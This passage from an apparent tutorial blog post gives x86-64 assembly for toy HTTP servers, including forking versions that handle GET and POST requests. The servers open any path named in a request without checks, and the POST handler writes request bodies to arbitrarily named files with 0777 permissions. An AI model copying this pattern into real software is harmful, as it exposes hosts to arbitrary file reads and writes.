0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">		# accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">		# read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">		# open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp accept_loop          # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests"></a>1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">    # accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # fork 函数调用</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值</span><br><span class="line">    js exit_failure        # 如果fork失败则退出</span><br><span class="line">    jz child_process       # 如果是子进程则跳转</span><br><span class="line"></span><br><span class="line">    # 父进程</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 关闭已接受的连接</span><br><span class="line">    syscall</span><br><span class="line">    jmp accept_loop        # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    # 关闭监听套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 3             # 关闭监听套接字</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]   # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi           # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0  # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2             # syscall: open</span><br><span class="line">    mov rdi, rdi           # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi           # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值以检查错误</span><br><span class="line">    js exit_failure        # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax           # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax           # 保存文件描述符</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区</span><br><span class="line">    mov rdx, 1024          # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12           # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]    # 响应内容的位置</span><br><span class="line">    mov rdx, 19            # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15           # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512             # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests"><a href="#1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests" class="headerlink" title="1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests"></a>1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # Open socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    # Store socket fd in rbx</span><br><span class="line">    mov rbx, rax</span><br><span class="line"></span><br><span class="line">    # Bind socket to address</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    lea rsi, sa_family_t</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Listen on socket</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    accept_jump:</span><br><span class="line">    # Accept a connection</span><br><span class="line">    mov rdi, rbx	# 接受的是open socket 返回的文件描述符，accept在打开的socket上监听链接，接受后返回对应客户端的文件描述符</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    # Save new fd for bound connection in r12</span><br><span class="line">    mov r12, rax	# 对应客户端的文件描述符</span><br><span class="line"></span><br><span class="line">    # Fork the process and let the child do the serving</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    cmp rax, 0	# 当 fork 返回 0 时表示其为子进程</span><br><span class="line">    je serve_connection</span><br><span class="line">    # Close the connection if parent 父进程关闭客户端的文件描述符，交给子进程与客户端交互</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    mov rax, 3		# syscall:close</span><br><span class="line">    syscall</span><br><span class="line">    # Then go back to listening # 继续监听</span><br><span class="line">    jmp accept_jump</span><br><span class="line"></span><br><span class="line">    serve_connection:</span><br><span class="line">    # Close listening socket 子进程不再监听客户端连接</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Read from the connection </span><br><span class="line">    mov rdi, r12</span><br><span class="line">    lea rsi, read_buffer	# read_buffer 在 .data 中声明的read_buffer，这里直接保存在对应地址中了</span><br><span class="line">    mov rdx, [read_packet_length] # 长度</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Figure out what file was requested</span><br><span class="line">    # 返回 file_path的第一个字符的地址</span><br><span class="line">    lea rdi, read_buffer # 第一个参数：将 read_buffer 标签对应的内存地址加载到对应的寄存器中</span><br><span class="line">    mov rsi, 1  # 第二个参数：1</span><br><span class="line">    lea rdx, space # 第三个参数：space的地址</span><br><span class="line">    call get_nth_substr # 返回第 n 次出现的子字符串的最后一个字符的地址</span><br><span class="line">    mov r13, rax # 保存文件地址</span><br><span class="line">    lea rdi, read_buffer</span><br><span class="line">    mov rsi, 2</span><br><span class="line">    call get_nth_substr</span><br><span class="line">    mov r14, rax # </span><br><span class="line">    sub r14, 1 # r14 文件名的最后一个地址</span><br><span class="line">    # r13 = start (exclusive), r14 = end (inclusive)</span><br><span class="line">    mov rdi, r13 # 文件名开始地址 </span><br><span class="line">    mov rsi, r14 # 文件名结束地址</span><br><span class="line">    lea rdx, file_name_buffer # 文件名将要保存到的地址</span><br><span class="line">    call write_to_buf</span><br><span class="line">    # Filename is now stored in file_name_buffer</span><br><span class="line"></span><br><span class="line">    # Check request type </span><br><span class="line">    mov dil, [read_buffer] # read_buffer 的第一个字符判断操作类型</span><br><span class="line">    # Compare to &quot;G&quot;</span><br><span class="line">    cmp dil, 0x47</span><br><span class="line">    # Continue (GET process) if G, otherwise do POST</span><br><span class="line">    jne POST</span><br><span class="line"></span><br><span class="line">    GET:</span><br><span class="line">        # Open that file</span><br><span class="line">        lea rdi, file_name_buffer</span><br><span class="line">        mov rsi, 0</span><br><span class="line">        mov rdx, 0</span><br><span class="line">        mov rax, 2</span><br><span class="line">        syscall</span><br><span class="line">        mov r13, rax # file 的文件描述符</span><br><span class="line"></span><br><span class="line">        # Read file contents</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        lea rsi, file_read_buffer # file content 保存的地方</span><br><span class="line">        mov rdx, 1024</span><br><span class="line">        mov rax, 0</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Close the file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 3</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write status to connection 向客户端socket发送HTTP状态</span><br><span class="line">        mov rdi, r12 </span><br><span class="line">        lea rsi, write_static # &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">        mov rdx, 19</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write file contents to connection</span><br><span class="line">        lea rdi, file_read_buffer</span><br><span class="line">        call get_len</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        sub rdx, 1</span><br><span class="line">        mov rdi, r12</span><br><span class="line">        lea rsi, file_read_buffer</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        jmp exit</span><br><span class="line"></span><br><span class="line">    POST:</span><br><span class="line">        # Open that file</span><br><span class="line">        lea rdi, file_name_buffer</span><br><span class="line">        mov rsi, 0x41 # O_CREAT, O_WRONLY</span><br><span class="line">        mov rdx, 0777</span><br><span class="line">        mov rax, 2</span><br><span class="line">        syscall</span><br><span class="line">        mov r13, rax</span><br><span class="line"></span><br><span class="line">        # Get the POST content</span><br><span class="line">        lea rdi, read_buffer</span><br><span class="line">        mov rsi, 1</span><br><span class="line">        lea rdx, double_cr_lf</span><br><span class="line">        call get_nth_substr</span><br><span class="line">        mov rsi, rax</span><br><span class="line">        add rsi, 1</span><br><span class="line"></span><br><span class="line">        # Get write length</span><br><span class="line">        mov rdi, rsi</span><br><span class="line">        call get_len</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        # Get rid of the pesky null byte</span><br><span class="line">        sub rdx, 1</span><br><span class="line">        # Write to file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Close the file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 3</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write status to connection</span><br><span class="line">        mov rdi, r12</span><br><span class="line">        lea rsi, write_static</span><br><span class="line">        mov rdx, 19</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">    exit:</span><br><span class="line">    # Close the connection</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Sys exit</span><br><span class="line">    mov 